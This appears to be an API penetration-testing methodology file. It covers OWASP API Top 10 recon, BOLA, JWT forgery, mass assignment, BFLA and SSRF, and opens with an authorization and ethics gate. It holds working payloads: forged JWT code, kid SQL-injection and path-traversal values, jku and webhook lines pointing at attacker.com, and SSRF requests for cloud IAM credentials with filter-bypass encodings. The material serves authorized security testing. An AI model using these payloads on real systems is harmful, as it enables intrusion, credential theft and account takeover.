---
name: api-security
description: Comprehensive API security testing methodology covering OWASP API Top 10 (2023), advanced vulnerability classes, protocol-specific attacks (REST, GraphQL, gRPC, WebSocket, SOAP), recon, payloads, tool commands, CVEs, false-positive elimination, and evidence standards derived from 299 classified real-world reports.
sources: hackerone_public, owasp, portswigger, bug_bounty_reports
---

# API Security Testing

## AUTHORIZATION & ETHICS GATE

**AUTHORIZATION FIRST** — Only test an API with explicit written authorization (bug bounty scope, signed engagement, or infrastructure you own). One out-of-scope request can end an engagement.

**Non-destructive** — no credential attacks against production auth, no unauthorized access to real users' data, no resource-exhaustion that degrades service. Prove impact with minimum necessary evidence, then stop.

**STOP ON DEGRADATION** — if a test causes errors, slowdowns, or instability, stop immediately.

**Zero-report gate** — NEVER write a vulnerability report until: reproduced from scratch, impact is real (not just 200 OK), evidence captured, false positives eliminated.

---

## HUNTING PRIORITY (data-driven from 299 classified reports)

```
1. SECURITY MISCONFIGURATION (33%)  → leaked API keys in JS/git/mobile, exposed debug/internal endpoints, verbose errors
2. BOLA / IDOR (21%)                → object-ID swap on every /resource/{id}, GraphQL node(), billing/export endpoints
3. BROKEN AUTHENTICATION (12%)      → JWT flaws, OAuth misconfig, weak session handling, missing auth on siblings
4. BFLA (9%)                        → admin/privileged functions reachable by normal role, method swap
5. INJECTION (9%)                   → SQLi/NoSQLi/SSTI/command injection through API params
6. RESOURCE CONSUMPTION (8%)        → missing rate limits, pagination abuse, cost amplification, GraphQL complexity
7. SSRF (2%, always High)           → every url=/webhook=/callback=/import= param → internal + cloud metadata
8. BUSINESS FLOWS / RACE (2%)       → coupons, payments, verification, limit bypass via concurrency
```

## A→B→C CHAIN TABLE

| Bug A | Hunt for Bug B | Escalate to C |
|---|---|---|
| BOLA read on `/resource/{id}` | PUT/PATCH/DELETE on the same object | Full cross-tenant data manipulation |
| Leaked API key in JS/git/mobile | Scope of the key across the API | Internal data access → lateral movement |
| SSRF via webhook/import param | Cloud metadata `169.254.169.254` | IAM credential exfil → infra access |
| JWT `alg:none` / weak secret accepted | Forge `role:admin` / other `sub` | Full account/privilege takeover |
| GraphQL introspection enabled | Missing field-level authz on a type | `node()` IDOR → mass PII export |
| Mass assignment accepts extra field | Set `isAdmin`/`role`/`verified` | Privilege escalation |
| OAuth `redirect_uri` too permissive | Open redirect on an allowed host | Auth-code theft → ATO |
| Old API version (`/v1/`) still live | Missing auth that `/v2/` added | Auth bypass on the whole surface |
| Verbose error / stack trace | Framework + version → known CVE | CVE exploitation (authorized lab) |
| Race on a state-change endpoint | Limit/coupon/balance logic | Financial or quota abuse |

---

## RECON METHODOLOGY

### Phase 1: Passive Discovery

**Certificate Transparency Logs**
```bash
# crt.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
names = set()
for entry in data:
    for name in entry.get('name_value', '').split('\n'):
        name = name.strip().lower()
        if name and '*' not in name:
            names.add(name)
for name in sorted(names):
    print(name)
" > ct_subdomains.txt

grep -iP "api|dev|staging|gateway|graphql|rest|internal" ct_subdomains.txt

# certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
names = set()
for entry in data:
    for name in entry.get('dns_names', []):
        name = name.strip().lower()
        if '*' not in name:
            names.add(name)
for name in sorted(names):
    print(name)
"
```

**Subdomain Enumeration**
```bash
subfinder -d target.com -all -o subdomains.txt
amass enum -passive -d target.com -o amass_subdomains.txt
cat subdomains.txt | dnsx -a -resp -o resolved.txt
cat subdomains.txt | httpx -ports 80,443,8080,8443,3000,5000,8000,9090 \
  -title -tech-detect -status-code -o httpx_results.txt
```

**API-specific subdomain patterns to check:**
```
api.target.com, api-v{1,2,3}.target.com, api-dev/staging/test/qa/uat/sandbox.target.com,
api-internal/admin/gateway/proxy.target.com, graphql.target.com, gql.target.com,
rest.target.com, ws.target.com, websocket.target.com, partner-api.target.com,
b2b-api.target.com, webhook.target.com, callback.target.com, internal.target.com,
developer.target.com, portal.target.com, gateway.target.com
```

**ASN Enumeration**
```bash
whois -h whois.radb.net -- "-i origin $(whois target.com | grep -i origin | \
  awk '{print $NF}')" | grep "route:" | awk '{print $2}'
amass intel -org "Target Organization"
# Scan ASN ranges
cat asn_ranges.txt | nmap -sV -p 80,443,8080,8443,3000,5000,8000 -iL - -oG api_scan_results.txt
```

**GitHub Dorks**
```
"target.com" api_key
"target.com" api_secret
"target.com" filename:swagger.json
"target.com" filename:swagger.yaml
"target.com" filename:openapi.json
"target.com" filename:.env
org:target filename:.env
org:target filename:swagger.json
org:target "api_key"
org:target "secret_key"
org:target "access_token"
org:target "AWS_ACCESS_KEY"
org:target path:postman
org:target filename:postman_collection.json
org:target "Authorization: Bearer"
org:target filename:.github/workflows
org:target filename:Dockerfile "API_URL"
```

**GitHub CLI**
```bash
gh search code "target.com api" --limit 100
gh search code "target.com" --filename swagger.json --limit 50
gh search code "target.com" --filename postman_collection.json --limit 50 --json path,repository
```

**Google Dorks**
```
site:target.com inurl:api
site:target.com inurl:swagger
site:target.com inurl:api-docs
site:target.com inurl:openapi
site:target.com filetype:json "openapi"
site:target.com filetype:yaml "swagger"
site:target.com filetype:env
site:target.com "internal server error" "api"
site:postman.com "target.com"
site:documenter.getpostman.com "target.com"
site:stackoverflow.com "target.com" "api"
```

**Wayback Machine**
```bash
curl -s "https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | \
  sort -u > wayback_urls.txt
grep -iP "(api|graphql|rest|v[0-9]+|swagger|openapi)" wayback_urls.txt > api_urls.txt

# Historical specs
for path in "swagger.json" "api-docs" "openapi.json" "openapi.yaml" "v2/api-docs"; do
  curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/${path}&output=json&fl=timestamp,original,statuscode"
done

# waymore
pip3 install waymore
waymore -i target.com -mode U -oU wayback_urls.txt
```

**JS Analysis**
```bash
# Extract script sources
curl -s https://target.com | grep -oP 'src="([^"]*\.js[^"]*)"' | sed 's/src="//;s/"//'

# Extract API endpoints from JS
grep -ohrP '["'"'"'](/api/[a-zA-Z0-9_/\-\.:{}]+)["'"'"']' *.js | sort -u
grep -ohrP '["'"'"'](/v[0-9]+/[a-zA-Z0-9_/\-\.:{}]+)["'"'"']' *.js | sort -u
grep -ohrP 'fetch\s*\(\s*["'"'"'`]([^"'"'"'`]+)["'"'"'`]' *.js | sort -u
grep -ohrP 'axios\.(get|post|put|patch|delete)\s*\(\s*["'"'"'`]([^"'"'"'`]+)' *.js | sort -u
grep -ohrP '\.open\s*\(\s*["'"'"'](?:GET|POST|PUT|PATCH|DELETE)["'"'"']\s*,\s*["'"'"'`]([^"'"'"'`]+)' *.js | sort -u
grep -ohrP '`[^`]*(/api/[^`]+)[^`]*`' *.js | sort -u   # template literals
grep -ohrP 'wss?://[a-zA-Z0-9\-\.]+[a-zA-Z0-9_/\-\.]*' *.js | sort -u

# Check for source maps
curl -s -o /dev/null -w "%{http_code}" https://target.com/static/js/main.js.map
grep -r "sourceMappingURL" *.js

# Extract from source maps
npm install -g sourcemapper
sourcemapper -url https://target.com/static/js/main.js.map -output ./extracted_source
unwebpack-sourcemap https://target.com/static/js/main.js.map ./output_dir

find ./extracted_source -type f \( -name "*.js" -o -name "*.ts" -o -name "*.tsx" \) | \
  xargs grep -n "api/\|/graphql\|fetch(\|baseUrl\|API_URL" | sort -u

# LinkFinder
python3 linkfinder.py -i https://target.com -o cli
```

**Mobile App Secrets**
```bash
# After decompilation (jadx for APK, class-dump for iOS)
grep -rn "api[_-]?key\s*[:=]" output_dir/ --include="*.java" --include="*.kt"
grep -rn "client[_-]?(id|secret)\s*[:=]" output_dir/ --include="*.java"
grep -rn "AKIA[0-9A-Z]{16}" output_dir/   # AWS keys
find output_dir -name "google-services.json" -exec cat {} \;  # Firebase
find output_dir -name "GoogleService-Info.plist" -exec cat {} \;  # iOS Firebase
grep -rn "password\s*[:=]\s*[\"'][^\"']+[\"']" output_dir/

# API base URL extraction
grep -rn "https\?://[a-zA-Z0-9.-]*api[a-zA-Z0-9.-]*\.[a-zA-Z]\{2,\}" \
  output_dir/ --include="*.java" --include="*.kt" | sort -u
find output_dir -name "BuildConfig.java" -exec grep -n "URL\|HOST\|API\|ENDPOINT" {} \;
```

**Secret Scanner Tools**
```bash
trufflehog github --org target --only-verified
gitleaks detect --source /path/to/repo --report-format json --report-path gitleaks_report.json
```

### Phase 2: Active Discovery

**Endpoint Brute-forcing**
```bash
# ffuf — basic
ffuf -u https://api.target.com/FUZZ -w /path/to/api-wordlist.txt \
  -mc 200,201,202,204,301,302,307,401,403,405 -o ffuf_results.json -of json

# ffuf — authenticated
ffuf -u https://api.target.com/api/v1/FUZZ \
  -w /path/to/api-wordlist.txt \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -mc 200,201,202,204,301,302,307,403,405

# ffuf — recursive
ffuf -u https://api.target.com/FUZZ -w wordlist.txt \
  -mc 200,201,202,204,301,302,307,401,403,405 -recursion -recursion-depth 3

# ffuf — POST discovery
ffuf -u https://api.target.com/api/v1/FUZZ \
  -w wordlist.txt -X POST -H "Content-Type: application/json" -d '{}' \
  -mc 200,201,202,204,400,401,403,405,422

# ffuf — filter false positives by size
ffuf -u https://api.target.com/FUZZ -w wordlist.txt -mc all -fs 0 -fw 1

# feroxbuster
feroxbuster -u https://api.target.com \
  -w /path/to/api-wordlist.txt \
  --status-codes 200 201 202 204 301 302 307 401 403 405 \
  --depth 3 --rate-limit 50 --json -o ferox_results.json

# gobuster
gobuster dir -u https://api.target.com -w /path/to/api-wordlist.txt \
  -s "200,201,202,204,301,302,307,401,403,405" -b "" -o results.txt

# VHOST discovery
gobuster vhost -u https://target.com -w /path/to/api-subdomains.txt --append-domain
```

**Wordlists**
```bash
# Assetnote (most comprehensive)
wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2024_11_28.txt

# SecLists
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
# SecLists/Discovery/Web-Content/api/, api-endpoints.txt, swagger.txt
```

**Version/Shadow API Enumeration**
```bash
for version in v0 v1 v2 v3 v4 v5 beta alpha legacy old internal dev staging; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/${version}/users")
  echo "${version}: ${code}"
done

# Date-based versioning
for year in 2018 2019 2020 2021 2022 2023 2024 2025; do
  for month in 01 06; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://api.target.com/${year}-${month}-01/users")
    echo "${year}-${month}-01: ${code}"
  done
done

# Compare rate limits between versions (older often lacks new security controls)
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/users"; done | sort | uniq -c
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v3/users"; done | sort | uniq -c
```

**Debug/Framework Endpoints**
```bash
# Spring Boot Actuator
for ep in health env beans heapdump mappings configprops trace loggers; do
  curl -s -o /dev/null -w "${ep}: %{http_code}\n" https://target.com/actuator/${ep}
done

# Django, Rails, Laravel
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/rails/info/routes
curl -s -o /dev/null -w "%{http_code}" https://target.com/telescope/

# GraphQL IDEs
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphql
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphiql
curl -s -o /dev/null -w "%{http_code}" https://target.com/playground
curl -s -o /dev/null -w "%{http_code}" https://target.com/console

# Internal infrastructure
curl -s https://target.com/api/v1/namespaces     # Kubernetes API
curl -s https://target.com:15000/config_dump      # Envoy admin
curl -s -o /dev/null -w "%{http_code}" https://target.com:9090/metrics   # Prometheus
curl -s -o /dev/null -w "%{http_code}" https://target.com:3000/api/org   # Grafana
curl -s -o /dev/null -w "%{http_code}" https://target.com:5601/api/status  # Kibana
curl -s -o /dev/null -w "%{http_code}" https://target.com:8500/v1/agent/self  # Consul
curl -s -o /dev/null -w "%{http_code}" https://target.com:8200/v1/sys/health  # Vault
```

**OpenAPI/Swagger Discovery**
```bash
SPEC_PATHS=("/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
  "/api-docs" "/api-docs.json" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
  "/openapi.json" "/openapi.yaml" "/.well-known/openapi.json"
  "/api/swagger.json" "/api/openapi.json" "/docs" "/redoc"
  "/swagger-ui.html" "/swagger-resources" "/api/spec" "/api/schema"
  "/internal/api-docs" "/debug/api" "/graphql/schema")

for path in "${SPEC_PATHS[@]}"; do
  for host in "https://target.com" "https://api.target.com"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "${host}${path}" --max-time 5)
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
      echo "[${code}] ${host}${path}"
    fi
  done
done
```

**HTTP Method Enumeration**
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" https://api.target.com/api/v1/users)
  echo "$method: $response"
done
```

**Content-Type Fuzzing**
```bash
for ct in "application/json" "application/xml" "application/x-www-form-urlencoded" \
  "multipart/form-data" "text/xml" "application/yaml" "application/soap+xml" \
  "application/x-protobuf" "application/cbor"; do
  echo "=== Content-Type: $ct ==="
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://api.target.com/api/v1/users" \
    -H "Content-Type: $ct" -d '{"test":"value"}'
done
```

**Hidden Parameter Discovery**
```bash
# Arjun
arjun -u https://api.target.com/api/v1/users
arjun -u https://api.target.com/api/v1/users -m POST \
  --headers "Content-Type: application/json"
arjun -u https://api.target.com/api/v1/users \
  --headers "Authorization: Bearer <token>"

# x8
x8 -u "https://api.target.com/api/v1/users" -w params.txt \
  -m POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" --json
x8 -u "https://api.target.com/api/v1/users" -w params.txt --headers
```

**Token Endpoint Enumeration**
```bash
for endpoint in "/oauth/token" "/token" "/auth/token" "/api/token" \
  "/oauth2/token" "/api/oauth/token" "/connect/token" "/oidc/token"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com${endpoint}" \
    -d "grant_type=client_credentials" --max-time 5)
  echo "${endpoint}: ${code}"
done
```

---

## API1:2023 — BOLA / IDOR

### Core Attack Procedure

1. Map every endpoint that accepts an object identifier (URL path, query param, request body, headers)
2. Classify IDs: sequential integer, UUID, encoded value, composite key, slug
3. Create two accounts: User A (attacker) and User B (victim, different org/group)
4. Obtain a valid ID belonging to User B
5. Replay User A's authenticated request with User B's ID substituted
6. Test all HTTP methods — GET may be protected but PUT/DELETE may not

### ID Substitution Payloads
```http
# Horizontal access — user swaps ID in path
GET /api/v1/users/1002/medical-records HTTP/1.1
Authorization: Bearer <user_a_token>

# Write-method IDOR (authorization may differ by method)
PUT /api/v1/orders/5001 HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"status": "cancelled"}

DELETE /api/v1/orders/5001 HTTP/1.1
Authorization: Bearer <user_a_token>

# Nested resource — validate project_id against org_id
GET /api/v1/orgs/10/projects/200/files/5001 HTTP/1.1
Authorization: Bearer <user_a_token>
# User A is in org 10 but project 200 belongs to org 20

# Bulk endpoint with mixed owned + unowned IDs
POST /api/v1/documents/bulk-export HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"document_ids": [1001, 1002, 1003, 1004, 1005], "format": "pdf"}

# Parameter pollution (middleware checks path, controller uses query)
GET /api/v1/users/1001/orders?user_id=1002 HTTP/1.1
Authorization: Bearer <user_a_token>

# File presigned URL generation
GET /api/v1/files/signed-url?key=users/1002/private/photo.jpg HTTP/1.1
Authorization: Bearer <user_a_token>

# File path traversal + BOLA
GET /api/v1/files/download?path=/users/1002/documents/tax_return.pdf HTTP/1.1
Authorization: Bearer <user_a_token>

# Webhook IDOR — receive another user's events
POST /api/v1/webhooks HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"url": "https://attacker.com/hook", "event": "order.completed", "user_id": 1002}
```

### GraphQL BOLA
```graphql
# node() global-ID access — base64("User:1002")
query {
  node(id: "VXNlcjoxMDAy") {
    ... on User {
      email
      ssn
      medicalRecords { diagnosis prescriptions }
    }
  }
}

# Nested relationship traversal (authorization may not apply via relationships)
query {
  viewer {
    organization {
      members {
        edges {
          node {
            privateDocuments { content }
          }
        }
      }
    }
  }
}

# Mutation-based BOLA — privilege escalation on another user
mutation {
  updateUser(id: "1002", input: {role: "admin"}) { id role }
}
```

### Indirect Object References
```http
GET /api/v1/users/lookup?email=victim@example.com HTTP/1.1
Authorization: Bearer <user_a_token>

GET /api/v1/profiles/victim-username/private-settings HTTP/1.1
Authorization: Bearer <user_a_token>

GET /api/v1/accounts/+15551234567/balance HTTP/1.1
Authorization: Bearer <user_a_token>
```

### Fuzz Values
```
seq 1000 1010 -> /api/v1/users/$id/profile   # Sequential enumeration
550e8400-e29b-41d4-a716-446655440000          # Leaked UUID direct reference
/api/v1/orgs/my-org/users/victim-user/settings  # Nested cross-tenant
{"role": "admin"}                              # Privilege escalation body
{"ids": [1001, 1002, 1003]}                    # Bulk-info
/api/v1/users/1001/data?user_id=1002           # Parameter pollution
{ node(id: "VXNlcjoxMDAy") { ... on User { email privateData } } }  # GraphQL
```

---

## API2:2023 — BROKEN AUTHENTICATION

### JWT Attacks

**CVE-2015-9235 — alg:none (jwt-go, jsonwebtoken, PyJWT older versions)**
```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator", "iat": 1699000000, "exp": 1699999999}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{header_b64}.{payload_b64}."
# Submit as Authorization: Bearer header
```

**CVE-2016-10555 / CVE-2022-29217 — Algorithm Confusion (RS256→HS256)**
```python
# Step 1: Get public key from JWKS endpoint
import jwt, requests
from cryptography.hazmat.primitives import serialization

jwks = requests.get('https://api.example.com/.well-known/jwks.json').json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
# Step 2: Sign new token with public key as HMAC secret (server accepts HS256 with its own public key)
forged_token = jwt.encode({"sub": "admin", "role": "administrator"}, public_key_pem, algorithm='HS256')
```

**CVE-2022-21449 — ECDSA Psychic Signatures (Java 15-18 before 17.0.3/18.0.1)**
- Create JWT with ECDSA signature (r=0, s=0) — 64 zero bytes
- Java's SunEC provider accepted this as valid for ANY message/key
- Universal forgery: create any JWT, Java accepts it

**kid SQL Injection**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1' UNION SELECT 'attacker-controlled-secret' -- "
}
```

**kid Path Traversal**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```

**jwk/jku Header Injection**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's public key modulus>",
    "e": "AQAB"
  }
}
```

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

**Weak Secret Cracking**
```bash
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/common_jwt_secrets.txt

# Common weak secrets found in production:
# "secret", "password", "123456", "your-256-bit-secret", "changeme",
# application name, company name, default from jwt.io
```

**JWT Token Expiration Bypass**
```
- Remove exp claim entirely
- Set exp to far future
- Exploit clock skew (60+ seconds tolerance)
- Manipulate nbf claim
```

**JWT Validation Checklist (all must pass)**
1. Structure: exactly 3 Base64URL segments separated by dots
2. `alg` in explicit allowlist — reject `none`, unexpected algorithms
3. Key selected from server-side store, NOT from `jwk`/`jku` headers
4. If `kid` used: validate against allowlist, never use in SQL/file path
5. `exp` validated (allow max 30-60s clock skew)
6. `nbf` validated if present
7. `iss` validated against expected value
8. `aud` validated against current service identifier
9. `sub` is a valid user in context
10. Token revocation check if blacklist is maintained

**Decode JWT Without Verification**
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | \
  cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

### OTP/MFA Attacks
```http
# 4-digit OTP brute-force (10,000 possibilities; 6-digit = 1,000,000)
POST /api/v1/auth/verify-otp HTTP/1.1
Content-Type: application/json
{"otp": "0000"}  # through {"otp": "9999"}

# OTP bypass attempts
{"otp": ""}         # empty string bypass
{"otp": null}       # null bypass
{"otp": 0}          # type confusion (integer vs string)

# OTP reuse — expired/used OTP
{"otp": "123456"}   # code from 5 minutes ago

# Race condition — submit same OTP simultaneously via HTTP/2 single-packet
```

### Credential Stuffing
Detection indicators:
- High volume login attempts from single IP; rotating IPs across many accounts
- Login attempts with valid usernames, varied passwords
- Geographic impossibility after successful login

---

## API3:2023 — BOPLA / MASS ASSIGNMENT

### Attack Procedure
1. Find endpoints that update data models: `POST /register`, `PUT /users/me`, `PATCH /settings`
2. Discover internal properties from GET responses: `role`, `is_admin`, `is_verified`, `balance`, `subscription_tier`, `permissions`, `price`, `discount`
3. Check error messages: invalid value for guessed field → validation error confirms field exists
4. Inject extra fields in request body

### Mass Assignment Payloads
```http
POST /api/v1/users HTTP/1.1
Content-Type: application/json
{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "secure_password",
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "balance": 999999,
  "subscription_tier": "enterprise",
  "permissions": ["read", "write", "admin", "delete"],
  "discount_percentage": 100,
  "account_type": "staff"
}
```

**Verify the result:**
```http
GET /api/v1/users/me HTTP/1.1
Authorization: Bearer <new_token>
# Check if any injected properties took effect
```

### Framework-Specific Vulnerable Patterns

**Ruby on Rails** — `User.new(params[:user])` without Strong Parameters; `permit!` in Rails 4+
**Django** — `fields = '__all__'` in ModelSerializer; `setattr(user, key, value)` loop over `request.data`
**Express.js** — `User.create(req.body)`; `User.findByIdAndUpdate(id, req.body)`
**Spring Boot** — `@ModelAttribute User user`; `@RequestBody User user` without DTO pattern
**Laravel** — `$guarded = []`; `User::create($request->all())`
**FastAPI** — using full model as request body without output filtering DTO

### gRPC Mass Assignment
```bash
grpcurl -d '{"user_id":"my-id","role":"admin","is_superuser":true}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/UpdateUser
```

---

## API4:2023 — UNRESTRICTED RESOURCE CONSUMPTION

### Rate Limit Testing
```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/users"
done | sort | uniq -c
```

### Pagination Abuse
```http
GET /api/v1/users?limit=999999999 HTTP/1.1
GET /api/v1/users?page_size=0 HTTP/1.1
# Look for missing upper bounds on page size
```

---

## API5:2023 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)

### Attack Procedure
1. Map privileged endpoints via JS analysis, OpenAPI spec, error messages
2. Test with normal user token: `/api/admin/*`, `/api/manage/*`, `/api/internal/*`
3. Try HTTP method override and method swap

### BFLA Attack Vectors
```http
# Access admin endpoint with user token
GET /api/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

# Method swap — admin function accessible via different method
POST /api/v1/users/1002/promote HTTP/1.1
Authorization: Bearer <regular_user_token>
Content-Type: application/json
{}

# HTTP method override headers
POST /api/v1/admin/settings HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
Authorization: Bearer <regular_user_token>

# Access billing/export endpoints
GET /api/v1/billing/invoices HTTP/1.1
Authorization: Bearer <regular_user_token>

POST /api/v1/reports/export-all HTTP/1.1
Authorization: Bearer <regular_user_token>

# Access other users' data via admin path
GET /api/admin/users/1002/settings HTTP/1.1
Authorization: Bearer <regular_user_token>
```

---

## API7:2023 — SERVER-SIDE REQUEST FORGERY (SSRF)

### SSRF Entry Points
```http
# Webhook registration (server POSTs to URL on event)
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "events": ["order.created"]}

# Webhook verification (server sends GET to URL to verify)
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json
{"url": "http://internal-admin.corp:8080/admin/delete-all-data", "events": ["test"]}

# URL preview/unfurl
POST /api/v1/messages HTTP/1.1
Content-Type: application/json
{"channel": "general", "text": "Check out http://169.254.169.254/latest/user-data"}

# Import from URL
POST /api/v1/import HTTP/1.1
Content-Type: application/json
{"source_url": "http://internal-db:5432/", "format": "csv"}

# Avatar URL import
PUT /api/v1/users/me/avatar HTTP/1.1
Content-Type: application/json
{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}

# PDF generation (wkhtmltopdf, Puppeteer, WeasyPrint fetch external resources)
POST /api/v1/reports/pdf HTTP/1.1
Content-Type: application/json
{"html": "<img src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'>"}
{"html": "<style>@import url('http://internal:8080/admin');</style><p>Report</p>"}
{"html": "<iframe src='http://169.254.169.254/latest/user-data'></iframe>"}

# Image proxy/resize
GET /api/v1/image-proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /api/v1/resize?src=http://internal:3000/admin&width=800 HTTP/1.1
```

### Cloud Metadata Endpoints
```
# AWS IMDSv1 (no auth required — just GET)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://[fd00:ec2::254]/latest/meta-data/   # IPv6

# AWS IMDSv2 (requires PUT first — some webhook vectors can add headers)
# Step 1: PUT http://169.254.169.254/latest/api/token
#         X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
#         X-aws-ec2-metadata-token: <token>

# GCP (requires Metadata-Flavor: Google header — some vectors can add headers)
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### IP Encoding Bypass Techniques
```
http://169.254.169.254/           # Standard IPv4
http://2852039166/                # Decimal integer (169*256^3 + 254*256^2 + 169*256 + 254)
http://0251.0376.0251.0376/       # Octal
http://0xa9.0xfe.0xa9.0xfe/      # Hex
http://169.254.0xa9.0376/        # Mixed encoding
http://[::ffff:169.254.169.254]/ # IPv6
http://[0:0:0:0:0:ffff:a9fe:a9fe]/
http://[::ffff:a9fe:a9fe]/
http://anything@169.254.169.254/ # With credentials
http://169.254.169.254:80/       # With port
http://169%2e254%2e169%2e254/    # URL-encoded dots
```

### URL Parser Confusion
```
gopher://169.254.169.254:25     # Arbitrary TCP data
dict://169.254.169.254:6379     # Redis protocol
file:///etc/passwd              # Local file
http://example.com#@169.254.169.254   # Fragment confusion
http://example.com\@169.254.169.254   # Authority confusion
http://169.254.169.254\@example.com
```

### DNS Rebinding
1. Register domain with TTL=0 or 1 second
2. First DNS resolution → 1.2.3.4 (passes URL validation)
3. Change DNS record → 169.254.169.254
4. Second DNS resolution (actual request) → hits metadata service
5. Prevention: resolve DNS once, validate IP, use IP (not hostname) for request

### Redirect Chain SSRF
```
# Attacker controls server that redirects:
https://attacker.com/redirect → http://169.254.169.254/latest/meta-data/
# URL validation allows attacker.com; server follows redirect
# Chain: attacker.com → legitimate-site.com → 302 → 169.254.169.254
```

### Real-World SSRF Impact
- Capital One (2019): SSRF → AWS IAM credentials → 100M+ customer records → $80M fine
- Reddit: SSRF via URL unfurling → ~$6,000 HackerOne
- GitLab: Multiple SSRF via import, webhook, Mermaid diagram rendering

**Bounty ranges:** Blind $500-$3,000 | Response readable $3,000-$10,000 | Cloud metadata with creds $10,000-$25,000+ | RCE $25,000-$100,000+

### SSRF Testing Checklist
```
[ ] All endpoints accepting URLs identified
[ ] http://169.254.169.254/ tested (AWS)
[ ] http://metadata.google.internal/ tested (GCP)
[ ] IP encoding variations tested (decimal, octal, hex, IPv6)
[ ] DNS rebinding tested (short TTL DNS)
[ ] Redirect chains tested
[ ] URL scheme variations tested (file://, gopher://, dict://)
[ ] URL parser confusion tested
[ ] Webhook URL registration tested
[ ] PDF generation with embedded URLs tested
[ ] Image proxy/resize endpoints tested
[ ] IMDSv2 bypass attempts made (PUT token + header)
[ ] OOB DNS callback received (for blind SSRF)
```

---

## API8:2023 — SECURITY MISCONFIGURATION

### Framework Debug Endpoints
```bash
# Spring Boot Actuator (CVE-class: sensitive data exposure)
for ep in health env beans heapdump mappings configprops trace loggers; do
  curl -s -o /dev/null -w "${ep}: %{http_code}\n" https://target.com/actuator/${ep}
done

# Django admin, Rails routes, Laravel Telescope
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/rails/info/routes
curl -s -o /dev/null -w "%{http_code}" https://target.com/telescope/
```

### OpenAPI Spec Security Analysis Issues to Check
- No global security scheme defined (every endpoint must define its own)
- API key in query parameter (exposed in logs/history)
- OAuth2 Implicit flow used (deprecated, tokens in URL)
